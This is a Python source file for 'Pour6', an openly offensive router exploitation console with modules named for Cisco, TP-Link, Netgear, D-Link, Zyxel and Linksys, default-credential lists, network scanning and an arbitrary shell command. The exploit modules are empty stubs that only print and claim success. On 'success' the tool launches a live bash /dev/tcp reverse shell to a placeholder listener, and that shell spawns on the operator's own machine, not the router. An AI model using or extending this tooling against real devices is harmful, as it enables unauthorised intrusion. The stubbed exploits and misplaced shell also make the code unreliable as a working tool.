import os
import socket
import subprocess
import time
import requests
from requests.auth import HTTPBasicAuth

class RouterExploitFramework:
    def __init__(self):
        self.modules = {
            "cisco_exploit": self.cisco_exploit,
            "tplink_exploit": self.tplink_exploit,
            "netgear_exploit": self.netgear_exploit,
            "dlink_exploit": self.dlink_exploit,
            "zyxel_exploit": self.zyxel_exploit,
            "linksys_exploit": self.linksys_exploit,
        }
        self.target_ip = None
        self.target_port = 80  
        self.username = None
        self.password = None
        self.wordlist = None  
        self.selected_module = None  
        self.built_in_usernames = self.load_built_in_usernames()  
        self.built_in_passwords = self.load_built_in_passwords()  
        self.print_logo()
        self.command_loop()  

    def print_logo(self):
        logo = r"""
██████╗░░█████╗░██╗░░░██╗██████╗░░█████╗░
██╔══██╗██╔══██╗██║░░░██║██╔══██╗██╔═══╝░
██████╔╝██║░░██║██║░░░██║██████╔╝██████╗░
██╔═══╝░██║░░██║██║░░░██║██╔══██╗██╔══██╗
██║░░░░░╚█████╔╝╚██████╔╝██║░░██║╚█████╔╝
╚═╝░░░░░░╚════╝░░╚═════╝░╚═╝░░╚═╝░╚════╝░
        """
        print(logo)

    def load_built_in_usernames(self):
        return ["admin", "user", "root", "guest", "admin1", "admin2", "test"]

    def load_built_in_passwords(self):
        return ["password", "123456", "admin", "letmein", "welcome", "12345678", "qwerty"]

    def command_loop(self):
        while True:
            command = input("\n[pour6> ").strip().lower()  
            if command == 'exit':
                print("Exiting...")
                break
            elif command == 'help':
                self.show_help()
            elif command.startswith('use'):
                parts = command.split()
                if len(parts) < 2:
                    print("Module name is required. Usage: use <module>")
                    continue
                module_name = parts[1]
                self.select_module(module_name)
            elif command.startswith('exec'):
                parts = command.split()
                if len(parts) < 2:
                    print("Shell command is required. Usage: exec <shell_command> <args>")
                    continue
                shell_command = parts[1]
                args = parts[2:]  
                self.exec_command(shell_command, args)
            elif command.startswith('search'):
                parts = command.split()
                if len(parts) < 2:
                    print("Search term is required. Usage: search <search_term>")
                    continue
                search_term = parts[1]
                self.search_module(search_term)
            elif command.startswith('scan'):
                self.scan_network()
            elif command.startswith('set target'):
                parts = command.split()
                if len(parts) == 3:
                    ip, port = parts[1], parts[2]
                    self.set_target(ip, int(port))
                elif len(parts) == 2:
                    ip = parts[1]
                    self.set_target(ip, 80)  
                else:
                    print("Usage: set target <ip> [<port>]")
            elif command.startswith('set wordlist'):
                parts = command.split()
                if len(parts) < 2:
                    print("Filepath is required. Usage: set wordlist <filepath>")
                    continue
                filepath = parts[2]  
                self.set_wordlist(filepath)
            elif command.startswith('show'):
                if 'info' in command:
                    self.show_info()
                elif 'options' in command:
                    self.show_options()
                elif 'wordlists' in command:
                    self.show_wordlists()
                elif 'devices' in command:
                    self.show_devices()
            elif command.startswith('run'):
                self.run_exploit()
            elif command.startswith('back'):
                self.selected_module = None
                print("Module deselected.")
            elif command.startswith('set'):
                parts = command.split()
                if len(parts) < 3:
                    print("Option and value are required. Usage: set <option> <value>")
                    continue
                option, value = parts[1], ' '.join(parts[2:])  
                self.set_option(option, value)
            elif command.startswith('check'):
                self.check_vulnerability()
            else:
                print("Unknown command. Type 'help' for options.")

    def show_help(self):
        print("Global commands:")
        print("    help                        Print this help menu")
        print("    use <module>                Select a module for usage")
        print("    exec <shell command> <args> Execute a command in a shell")
        print("    search <search term>        Search for appropriate module for example of using this search cisco")
        print("    exit                        Exit Pour6")
        print("")
        print("Module commands:")
        print("    run                                 Run the selected module with the given options")
        print("    back                                De-select the current module")
        print("    set <option name> <option value>    Set an option for the selected module")
        print("    setg <option name> <option value>   Set an option for all of the modules")
        print("    unsetg <option name>                Unset option that was set globally")
        print("    show [info|options|devices]         Print information, options, or target devices for a module")
        print("    check                               Check if a given target is vulnerable to a selected module's exploit")

    def scan_network(self):
        print("Scanning for routers on the local network...")
        routers = []
        try:
            result = subprocess.run(['arp-scan', '-l'], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True, timeout=10)
            output = result.stdout
            if result.returncode != 0:
                print(f"Error running arp-scan: {result.stderr}")
                return
            lines = output.splitlines()
            for line in lines:
                if "router" in line.lower() or "gateway" in line.lower():
                    routers.append(line)
            print("Found routers:")
            for router in routers:
                print(router)
            if not routers:
                print("No routers found.")
        except subprocess.TimeoutExpired:
            print("The scan took too long and was terminated.")
        except Exception as e:
            print(f"Error scanning the network: {e}")

    def set_target(self, ip, port=80):
        self.target_ip = ip
        self.target_port = port
        print(f"Target set to {self.target_ip}:{self.target_port}")

    def set_wordlist(self, filepath):
        if os.path.exists(filepath):
            self.wordlist = filepath
            print(f"Wordlist set to {self.wordlist}")
        else:
            print("Wordlist file not found.")

    def select_module(self, module_name):
        if module_name in self.modules:
            self.selected_module = module_name
            print(f"Module selected: {self.selected_module}")
        else:
            print("Module not found.")

    def run_exploit(self):
        if self.selected_module:
            print(f"Running exploit: {self.selected_module} on {self.target_ip}:{self.target_port}")
            success = self.modules[self.selected_module]()  
            if success:
                self.start_reverse_shell()
        else:
            print("No module selected.")

    def exec_command(self, shell_command, args):
        command = [shell_command] + args
        try:
            result = subprocess.run(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
            print("Command output:")
            print(result.stdout)
            print("Command error (if any):")
            print(result.stderr)
        except Exception as e:
            print(f"Error executing command: {e}")

    def search_module(self, search_term):
        print(f"Searching for modules containing: {search_term}")
        found_modules = [key for key in self.modules if search_term in key]
        if found_modules:
            print("Found modules:")
            for module in found_modules:
                print(module)
        else:
            print("No modules found.")

    def show_options(self):
        if self.selected_module:
            print(f"Options for {self.selected_module}:")
            print(" - target")
            print(" - username")
            print(" - password")
        else:
            print("No module selected.")

    def show_info(self):
        if self.selected_module:
            print(f"Information about {self.selected_module}:")
            print(" - This is a dummy description for the module.")
        else:
            print("No module selected.")

    def show_wordlists(self):
        if self.wordlist:
            print(f"Current wordlist: {self.wordlist}")
        else:
            print("No wordlist set.")

    def show_devices(self):
        print("Detected devices on the network:")
        print(" - Device 1")
        print(" - Device 2")
        print(" - Device 3")

    def set_option(self, option, value):
        print(f"Setting option: {option} = {value}")

    def check_vulnerability(self):
        print(f"Checking vulnerability for {self.target_ip}:{self.target_port}")

    def cisco_exploit(self):
        print("Exploiting Cisco...")
        # Simulate a successful exploit
        return True

    def tplink_exploit(self):
        print("Exploiting TP-Link...")
        # Simulate a successful exploit
        return True

    def netgear_exploit(self):
        print("Exploiting Netgear...")
        # Simulate a successful exploit
        return True

    def dlink_exploit(self):
        print("Exploiting D-Link...")
        # Simulate a successful exploit
        return True

    def zyxel_exploit(self):
        print("Exploiting Zyxel...")
        # Simulate a successful exploit
        return True

    def linksys_exploit(self):
        print("Exploiting Linksys...")
        # Simulate a successful exploit
        return True

    def start_reverse_shell(self):
        listener_ip = "your_listener_ip"  # Replace with your listener's IP address
        listener_port = 4444  # Change the port if needed

        # Create a reverse shell
        shell_command = f"/bin/bash -i >& /dev/tcp/{listener_ip}/{listener_port} 0>&1"
        
        print(f"Starting reverse shell to {listener_ip}:{listener_port}...")
        
        try:
            # Execute the reverse shell command
            subprocess.Popen(["bash", "-c", shell_command])
            print("Reverse shell initiated.")
        except Exception as e:
            print(f"Error starting reverse shell: {e}")

if __name__ == "__main__":
    RouterExploitFramework()
